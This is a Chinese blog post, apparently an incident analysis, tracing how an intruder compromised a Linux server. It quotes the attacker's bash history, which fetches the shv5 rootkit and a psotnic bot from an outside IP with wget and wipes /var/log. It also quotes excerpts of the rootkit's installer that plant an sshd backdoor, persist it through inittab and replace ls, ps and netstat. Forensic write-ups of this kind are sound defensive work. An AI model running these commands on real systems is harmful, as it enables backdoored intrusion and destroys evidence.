---
layout: post
title: "一次服务器被入侵后的分析"
date: 2013-09-23 18:42:23 +0800
comments: true
categories: 
---
<!--more-->
<p>最近有个朋友让我去帮他看一下他的Linux服务器，说是Apache启动不了，有很多诡异的情况。后来证明绝不是Apache启动不了这么简单。</p>

<p>登上服务器之后随便看了下,最先引起我注意的是&rdquo;ls&rdquo;命令的输出：</p>

<p></p>

<pre><ol class="dp-xml"><li class="alt"><span><span>lars@server1:~$&nbsp;ls&nbsp;</span></span></li><li><span>&nbsp;&nbsp;ls:&nbsp;invalid&nbsp;option&nbsp;--&nbsp;h&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;Try&nbsp;`ls&nbsp;--help'&nbsp;for&nbsp;more&nbsp;information.&nbsp;</span></li></ol></pre>

<p></p>

<p>为什么&rdquo;ls&rdquo;默认加了&rdquo;-h&rdquo;参数呢?我用&rdquo;alias&rdquo;命令看了一下,然后取消了这个别名之后&rdquo;ls&rdquo;就工作正常了。</p>

<pre><ol class="dp-xml"><li class="alt"><span><span>lars@server1:~$&nbsp;alias&nbsp;ls&nbsp;</span></span></li><li><span>&nbsp;&nbsp;alias&nbsp;<span class="attribute">ls</span><span>=</span><span class="attribute-value">'ls&nbsp;-sh&nbsp;--color=auto'</span><span>&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;lars@server1:~$&nbsp;unalias&nbsp;ls&nbsp;</span></li><li><span>&nbsp;&nbsp;lars@server1:~$&nbsp;ls&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;backup&nbsp;</span></li><li><span>&nbsp;&nbsp;lars@server1:~$&nbsp;</span></li></ol></pre>

<p></p>

<p>虽然很奇怪,不过我的首要任务是先把apache启动起来,等过会再仔细研究这个问题。</p>

<pre><ol class="dp-xml"><li class="alt"><span><span>lars@server1:~$&nbsp;sudo&nbsp;/etc/init.d/apache2&nbsp;start&nbsp;</span></span></li><li><span>&nbsp;&nbsp;Password:&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;*&nbsp;Starting&nbsp;apache&nbsp;2.0&nbsp;web&nbsp;server...&nbsp;</span></li><li><span>&nbsp;&nbsp;(2):&nbsp;apache2:&nbsp;could&nbsp;not&nbsp;open&nbsp;error&nbsp;log&nbsp;file&nbsp;/var/log/apache2/error.log.&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;Unable&nbsp;to&nbsp;open&nbsp;logs&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;...fail!&nbsp;</span></li></ol></pre>

<p></p>

<p>纳尼?赶紧去&rdquo;/var/log/&rdquo;目录一看,果然&rdquo;apache2/&rdquo;文件夹不见了.而且这个目录下其他的文件夹,比如&rdquo;mysql/&rdquo;,&rdquo;samba/&rdquo;也都不见了.一定是哪里出错了.会不会是我朋友不小心删掉了呢,他跟我说绝对没有.然后我用root登录进去准备修复日志丢失的问题。</p>

<pre><ol class="dp-xml"><li class="alt"><span><span>lars@server1:~$&nbsp;sudo&nbsp;-i&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;Password:&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;root@server1:~#&nbsp;ls&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;ls:&nbsp;unrecognized&nbsp;prefix:&nbsp;do&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;ls:&nbsp;unparsable&nbsp;value&nbsp;for&nbsp;LS_COLORS&nbsp;environment&nbsp;variable&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;total&nbsp;44&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4&nbsp;.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4&nbsp;.bashrc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4&nbsp;.ssh&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4&nbsp;..&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4&nbsp;.lesshst&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8&nbsp;.viminfo&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8&nbsp;.bash_history&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4&nbsp;.profile&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4&nbsp;.vimrc&nbsp;</span></li></ol></pre>

<p></p>

<p>很不幸的发现,&rdquo;ls&rdquo;又出问题了.同样,用&rdquo;alias&rdquo;命令：</p>

<pre><ol class="dp-xml"><li class="alt"><span><span>root@server1:~#&nbsp;alias&nbsp;ls&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;alias&nbsp;<span class="attribute">ls</span><span>=</span><span class="attribute-value">'ls&nbsp;-sa&nbsp;--color=auto'</span><span>&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;root@server1:~#&nbsp;unalias&nbsp;ls&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;root@server1:~#&nbsp;ls&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;root@server1:~#&nbsp;</span></li></ol></pre>

<p></p>

<p>这个时候,我才意识到问题的严重性.&rdquo;ls&rdquo;奇怪的举动和&rdquo;/var/log/&rdquo;大量日志被删除让我怀疑服务器是否被入侵了.当我看到root目录下的&rdquo;.bash_history&rdquo;时,就已经可以确定被入侵了。</p>

<pre><ol class="dp-xml"><li class="alt"><span><span>root@server1:~#&nbsp;cat&nbsp;-n&nbsp;.bash_history&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;...&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;340&nbsp;&nbsp;w&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;341&nbsp;&nbsp;cd&nbsp;/var&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;342&nbsp;&nbsp;wget&nbsp;http://83.19.148.250/~matys/pliki/shv5.tar.gz&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;343&nbsp;&nbsp;tar&nbsp;-zxf&nbsp;shv5.tar.gz&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;344&nbsp;&nbsp;rm&nbsp;-rf&nbsp;shv5.tar.gz&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;345&nbsp;&nbsp;mv&nbsp;shv5&nbsp;.x&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;346&nbsp;&nbsp;cd&nbsp;.x&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;347&nbsp;&nbsp;./setup&nbsp;zibi.joe.149&nbsp;54098&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;348&nbsp;&nbsp;passwd&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;349&nbsp;&nbsp;passwd&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;350&nbsp;&nbsp;ps&nbsp;aux&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;351&nbsp;&nbsp;crontab&nbsp;-l&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;352&nbsp;&nbsp;cat&nbsp;/etc/issue&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;353&nbsp;&nbsp;cat&nbsp;/etc/passwd&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;354&nbsp;&nbsp;w&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;355&nbsp;&nbsp;who&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;356&nbsp;&nbsp;cd&nbsp;/usr/lib/libsh&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;357&nbsp;&nbsp;ls&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;358&nbsp;&nbsp;hide&nbsp;+&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;359&nbsp;&nbsp;chmod&nbsp;+x&nbsp;hide&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;360&nbsp;&nbsp;hide&nbsp;+&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;361&nbsp;&nbsp;./hide&nbsp;+&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;362&nbsp;&nbsp;cd&nbsp;/var/.x&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;363&nbsp;&nbsp;mkdir&nbsp;psotnic&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;364&nbsp;&nbsp;cd&nbsp;psotnic&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;365&nbsp;&nbsp;wget&nbsp;http://83.19.148.250/~matys/pliki/psotnic0.2.5.tar.gz&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;366&nbsp;&nbsp;tar&nbsp;-zxf&nbsp;psotnic0.2.5.tar.gz&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;367&nbsp;&nbsp;rm&nbsp;-rf&nbsp;psotnic0.2.5.tar.gz&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;368&nbsp;&nbsp;ls&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;369&nbsp;&nbsp;mv&nbsp;psotnic-0.2.5-linux-static-ipv6&nbsp;synscan&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;370&nbsp;&nbsp;./synscan&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;371&nbsp;&nbsp;vi&nbsp;conf&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;372&nbsp;&nbsp;vi&nbsp;conf1&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;373&nbsp;&nbsp;mv&nbsp;synscan&nbsp;smbd&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;374&nbsp;&nbsp;smbd&nbsp;-c&nbsp;conf&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;375&nbsp;&nbsp;ls&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;376&nbsp;&nbsp;ps&nbsp;aux&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;377&nbsp;&nbsp;ls&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;378&nbsp;&nbsp;./smbd&nbsp;-c&nbsp;conf&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;379&nbsp;&nbsp;./smbd&nbsp;-c&nbsp;conf1&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;380&nbsp;&nbsp;./smbd&nbsp;conf&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;381&nbsp;&nbsp;./smbd&nbsp;conf1&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;382&nbsp;&nbsp;./smbd&nbsp;-a&nbsp;conf&nbsp;conf1&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;383&nbsp;&nbsp;rm&nbsp;-rf&nbsp;conf.dec&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;384&nbsp;&nbsp;rm&nbsp;-rf&nbsp;conf1.dec&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;385&nbsp;&nbsp;cd&nbsp;/usr/lib/libsh&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;386&nbsp;&nbsp;./hide&nbsp;+&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;387&nbsp;&nbsp;exit&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;...&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;425&nbsp;&nbsp;ssh&nbsp;ftp@62.101.251.166&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;426&nbsp;&nbsp;w&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;427&nbsp;&nbsp;ls&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;428&nbsp;&nbsp;ls&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;429&nbsp;&nbsp;cd&nbsp;/var/.x&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;430&nbsp;&nbsp;ls&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;431&nbsp;&nbsp;cd&nbsp;psotnic/&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;432&nbsp;&nbsp;ls&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;433&nbsp;&nbsp;rm&nbsp;-rf&nbsp;/var/log/*&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;434&nbsp;&nbsp;exit&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;435&nbsp;&nbsp;ls&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;436&nbsp;&nbsp;cd&nbsp;/var/.x/psotnic/&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;437&nbsp;&nbsp;ls&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;438&nbsp;&nbsp;vi&nbsp;conf2&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;439&nbsp;&nbsp;./smbd&nbsp;-c&nbsp;conf2&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;440&nbsp;&nbsp;./smbd&nbsp;conf2&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;441&nbsp;&nbsp;./smbd&nbsp;-a&nbsp;conf&nbsp;conf1&nbsp;conf2&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;442&nbsp;&nbsp;rm&nbsp;-rf&nbsp;conf2.dec&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;443&nbsp;&nbsp;cd&nbsp;..&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;444&nbsp;&nbsp;ls&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;445&nbsp;&nbsp;cd&nbsp;/usr/lib/libsh&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;446&nbsp;&nbsp;hide&nbsp;+&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;447&nbsp;&nbsp;./hide&nbsp;+&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;448&nbsp;&nbsp;exit&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;449&nbsp;&nbsp;ps&nbsp;aux&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;450&nbsp;&nbsp;cd&nbsp;/var/.x&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;451&nbsp;&nbsp;ls&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;452&nbsp;&nbsp;ls&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;453&nbsp;&nbsp;cd&nbsp;psotnic/&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;454&nbsp;&nbsp;ls&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;455&nbsp;&nbsp;cat&nbsp;pid.MastaH&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;456&nbsp;&nbsp;kill&nbsp;-9&nbsp;2030&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;457&nbsp;&nbsp;./synscan&nbsp;-a&nbsp;conf&nbsp;conf1&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;458&nbsp;&nbsp;./smbd&nbsp;-a&nbsp;conf&nbsp;conf1&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;459&nbsp;&nbsp;cd&nbsp;/usr/lib/libsh&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;460&nbsp;&nbsp;./hide&nbsp;+&nbsp;</span></li></ol></pre>

<p></p>

<p>这个系统已经被入侵了.这实在是令人激动的一件事情,不过很显然,我的朋友不这么想.这个入侵者犯了一个很基本的错误,没有清除&rdquo;.bash_history&rdquo;文件.所以他/她可能在其他的地方也留下了一些蛛丝马迹.接下来就是详细的分析一下这次入侵。</p>

<p>通过bash history我们得到了大量的信息.先来看一下&rdquo;/var/.x&rdquo;下面隐藏了什么和命令&rdquo;setup zibi.joe.149 54098&Prime;的作用吧。</p>

<pre><ol class="dp-xml"><li class="alt"><span><span>root@server1:/var/.x#&nbsp;file&nbsp;setup&nbsp;</span></span></li><li><span>&nbsp;&nbsp;setup:&nbsp;Bourne-Again&nbsp;shell&nbsp;script&nbsp;text&nbsp;executable&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;root@server1:/var/.x#&nbsp;wc&nbsp;-l&nbsp;setup&nbsp;</span></li><li><span>&nbsp;&nbsp;825&nbsp;setup&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;root@server1:/var/.x#&nbsp;head&nbsp;-17&nbsp;setup&nbsp;</span></li><li><span>&nbsp;&nbsp;#!/bin/bash&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;#&nbsp;</span></li><li><span>&nbsp;&nbsp;#&nbsp;shv5-internal-release&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;#&nbsp;by:&nbsp;PinT[x]&nbsp;April/2003&nbsp;</span></li><li><span>&nbsp;&nbsp;#&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;#&nbsp;greetz&nbsp;to:&nbsp;</span></li><li><span>&nbsp;&nbsp;#&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;#&nbsp;[*]&nbsp;SH-members:&nbsp;BeSo_M,&nbsp;grass^,&nbsp;toolman,&nbsp;nobody,&nbsp;niceboy,&nbsp;armando99&nbsp;</span></li><li><span>&nbsp;&nbsp;#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C00L|0,&nbsp;GolDenLord,&nbsp;Spike,&nbsp;zion&nbsp;...&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;#&nbsp;[*]&nbsp;Alba-Hack&nbsp;:&nbsp;2Cool,&nbsp;heka,&nbsp;TheMind,&nbsp;ex-THG&nbsp;members&nbsp;...&nbsp;</span></li><li><span>&nbsp;&nbsp;#&nbsp;[*]&nbsp;SH-friends:&nbsp;mave,&nbsp;AlexTG,&nbsp;Cat|x,&nbsp;klex,&nbsp;JinkS&nbsp;...&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;#&nbsp;[*]&nbsp;tC-members:&nbsp;eksol,&nbsp;termid,&nbsp;hex,&nbsp;keyhook,&nbsp;maher,&nbsp;tripod&nbsp;etc..&nbsp;</span></li><li><span>&nbsp;&nbsp;#&nbsp;[*]&nbsp;And&nbsp;all&nbsp;others&nbsp;who&nbsp;diserve&nbsp;to&nbsp;be&nbsp;here&nbsp;but&nbsp;i&nbsp;forgot&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;#&nbsp;[*]&nbsp;them&nbsp;at&nbsp;the&nbsp;moment&nbsp;!&nbsp;</span></li><li><span>&nbsp;&nbsp;#&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;#&nbsp;PRIVATE&nbsp;!&nbsp;DO&nbsp;NOT&nbsp;DISTRIBUTE&nbsp;*censored*EZ&nbsp;!&nbsp;</span></li></ol></pre>

<p></p>

<p>&ldquo;setup&rdquo;这个脚本是rootkit shv5的安装脚本.它安装了一个修改过的ssh后门&ndash;&rdquo;/bin/ttyload&rdquo;,然后把它加到了&rdquo;/etc/inittab&rdquo;,这样每次重启后就会自动启动.(相关部分的脚本如下:)</p>

<pre><ol class="dp-xml"><li class="alt"><span><span>mv&nbsp;$SSHDIR/sshd&nbsp;/sbin/ttyload&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;chmod&nbsp;a+xr&nbsp;/sbin/ttyload&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;chmod&nbsp;o-w&nbsp;/sbin/ttyload&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;touch&nbsp;-acmr&nbsp;/bin/ls&nbsp;/sbin/ttyload&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;chattr&nbsp;+isa&nbsp;/sbin/ttyload&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;kill&nbsp;-9&nbsp;`pidof&nbsp;ttyload`&nbsp;<span class="tag">&gt;</span><span>/dev/null&nbsp;2</span><span class="tag">&gt;</span><span>&amp;1&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;....&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;#&nbsp;INITTAB&nbsp;SHUFFLING&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;chattr&nbsp;-isa&nbsp;/etc/inittab&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;cat&nbsp;/etc/inittab&nbsp;|grep&nbsp;-v&nbsp;ttyload|grep&nbsp;-v&nbsp;getty&nbsp;<span class="tag">&gt;</span><span>&nbsp;/tmp/.init1&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;cat&nbsp;/etc/inittab&nbsp;|grep&nbsp;getty&nbsp;<span class="tag">&gt;</span><span>&nbsp;/tmp/.init2&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;#&nbsp;Loading&nbsp;standard&nbsp;ttys&quot;&nbsp;<span class="tag">&gt;</span><span class="tag">&gt;</span><span>&nbsp;/tmp/.init1&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;0:2345:once:/usr/sbin/ttyload&quot;&nbsp;<span class="tag">&gt;</span><span class="tag">&gt;</span><span>&nbsp;/tmp/.init1&nbsp;</span></span></li></ol></pre>

<p></p>

<p>它也替换了一些linux的标准命令。</p>

<pre><ol class="dp-xml"><li class="alt"><span><span>#&nbsp;Backdoor&nbsp;ps/top/du/ls/netstat/etc..&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;cd&nbsp;$BASEDIR/bin&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;<span class="attribute">BACKUP</span><span>=/usr/lib/libsh/.backup&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;mkdir&nbsp;$BACKUP&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;...&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;#&nbsp;ls&nbsp;...&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;chattr&nbsp;-isa&nbsp;/bin/ls&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;cp&nbsp;/bin/ls&nbsp;$BACKUP&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;mv&nbsp;-f&nbsp;ls&nbsp;/bin/ls&nbsp;</span></li><li><span>&nbsp;&nbsp;&nbsp;chattr&nbsp;+isa&nbsp;/bin/ls&nbsp;</span></li></ol></pre>

<p></p>

<p>这样子就可以解释为什么&rdquo;ls&rdquo;命令输出那么奇怪了。</p>

<p>&ldquo;.backup&rdquo;文件夹保存了被替换之前的命令程序。</p>

<pre><ol class="dp-xml"><li class="alt"><span><span>root@server1:/var/.x#&nbsp;ls&nbsp;-l&nbsp;/usr/lib/libsh/.backup/&nbsp;</span></span></li><li><span>&nbsp;&nbsp;total&nbsp;552&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;-rwxr-xr-x&nbsp;&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;126276&nbsp;Dec&nbsp;24&nbsp;22:58&nbsp;find&nbsp;</span></li><li><span>&nbsp;&nbsp;-rwxr-xr-x&nbsp;&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;59012&nbsp;Dec&nbsp;24&nbsp;22:58&nbsp;ifconfig&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;-rwxr-xr-x&nbsp;&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;77832&nbsp;Dec&nbsp;24&nbsp;22:58&nbsp;ls&nbsp;</span></li><li><span>&nbsp;&nbsp;-rwxr-xr-x&nbsp;&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;30388&nbsp;Dec&nbsp;24&nbsp;22:58&nbsp;md5sum&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;-rwxr-xr-x&nbsp;&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;99456&nbsp;Dec&nbsp;24&nbsp;22:58&nbsp;netstat&nbsp;</span></li><li><span>&nbsp;&nbsp;-rwxr-xr-x&nbsp;&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;65492&nbsp;Dec&nbsp;24&nbsp;22:58&nbsp;ps&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;-rwxr-xr-x&nbsp;&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;14016&nbsp;Dec&nbsp;24&nbsp;22:58&nbsp;pstree&nbsp;</span></li><li><span>&nbsp;&nbsp;-rwxr-xr-x&nbsp;&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;50180&nbsp;Dec&nbsp;24&nbsp;22:58&nbsp;top&nbsp;</span></li></ol></pre>

<p></p>

<p>看了一下时间戳,居然是在圣诞节。</p>

<p>很显然,原始的&rdquo;ls&rdquo;和后门安装的&rdquo;ls&rdquo;是不一样的.他们的md5对比如下：</p>

<p></p>

<pre><ol class="dp-xml"><li class="alt"><span><span>root@server1:~#&nbsp;md5sum&nbsp;/usr/lib/libsh/.backup/ls&nbsp;/bin/ls&nbsp;</span></span></li><li><span>eef7ca9dd6be1cc53bac84012f8d1675&nbsp;&nbsp;/usr/lib/libsh/.backup/ls&nbsp;</span></li><li class="alt"><span>0a07cf554c1a74ad974416f60916b78d&nbsp;&nbsp;/bin/ls&nbsp;</span></li><li><span>&nbsp;&nbsp;</span></li><li class="alt"><span>root@server1:~#&nbsp;file&nbsp;/bin/ls&nbsp;</span></li><li><span>/bin/ls:&nbsp;ELF&nbsp;32-bit&nbsp;LSB&nbsp;executable,&nbsp;Intel&nbsp;80386,&nbsp;version&nbsp;1&nbsp;(SYSV),&nbsp;for&nbsp;GNU/Linux&nbsp;2.0.0,&nbsp;dynamically&nbsp;linked&nbsp;</span></li><li class="alt"><span>(uses&nbsp;shared&nbsp;libs),&nbsp;for&nbsp;GNU/Linux&nbsp;2.0.0,&nbsp;stripped&nbsp;</span></li><li><span>&nbsp;&nbsp;</span></li><li class="alt"><span>root@server1:~#&nbsp;file&nbsp;/usr/lib/libsh/.backup/ls&nbsp;</span></li><li><span>/usr/lib/libsh/.backup/ls:&nbsp;ELF&nbsp;32-bit&nbsp;LSB&nbsp;executable,&nbsp;Intel&nbsp;80386,&nbsp;version&nbsp;1&nbsp;(SYSV),&nbsp;for&nbsp;GNU/Linux&nbsp;2.6.0,&nbsp;dynamically&nbsp;linked&nbsp;</span></li><li class="alt"><span>(uses&nbsp;shared&nbsp;libs),&nbsp;for&nbsp;GNU/Linux&nbsp;2.6.0,&nbsp;stripped&nbsp;</span></li></ol></pre>

<p>这个rootkit(&ldquo;sh5.tar.gz&rdquo;)是从下面的地址下载的。</p>

<pre><ol class="dp-xml"><li class="alt"><span><span>root@server1:~#&nbsp;dig&nbsp;+short&nbsp;-x&nbsp;83.19.148.250&nbsp;</span></span></li><li><span>&nbsp;&nbsp;&nbsp;4lo.bydg.pl.&nbsp;</span></li></ol></pre>

<p></p>

<p>这是一个波兰的ip,从这个ip上没有得到更多的信息.不过这个入侵者依然犯了几个严重的错误.</p>

<p>这是运行&rdquo;setup&rdquo;命令的截图:(在服务器上的沙盒里运行的)</p>

